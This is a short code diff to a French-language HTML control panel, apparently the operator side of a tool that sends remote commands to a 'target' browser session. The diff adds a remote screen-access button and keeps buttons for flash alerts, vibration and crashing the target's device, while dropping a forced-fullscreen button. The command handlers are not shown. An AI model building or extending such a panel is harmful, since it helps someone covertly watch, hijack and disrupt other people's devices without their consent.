@@ -983,10 +983,9 @@
                     <div id="tab-control" class="tab-content">
                         <div class="action-card">
                             <h4>Commandes à distance</h4>
-                            <p style="font-size: 0.75rem; color: var(--text-dim); margin-bottom: 10px;">Note: Les commandes dépendent des permissions du navigateur de la cible.</p>
-                            <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash à envoyer en plein écran :'); if(msg) sendCommand('${sid}', 'FLASH_ALERT', {message: msg})">Alerte Flash</button>
-                            <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'VIBRATE', {duration: 1000})">Faire Vibrer</button>
-                            <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'FULLSCREEN')">Forcer Plein Écran</button>
+                            <button class="btn-refresh btn-action-full" style="background: #8b5cf6;" onclick="sendCommand('${sid}', 'SCREEN_SHARE')">Accès Écran (Remote) 📺</button>
+                            <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash :'); if(msg) sendCommand('${sid}', 'FLASH_ALERT', {message: msg})">Alerte Flash</button>
+                            <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'VIBRATE')">Faire Vibrer</button>
                             <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="sendCommand('${sid}', 'STOP_DEVICE')">Arrêter l'appareil (Crash)</button>
                         </div>
                     </div>
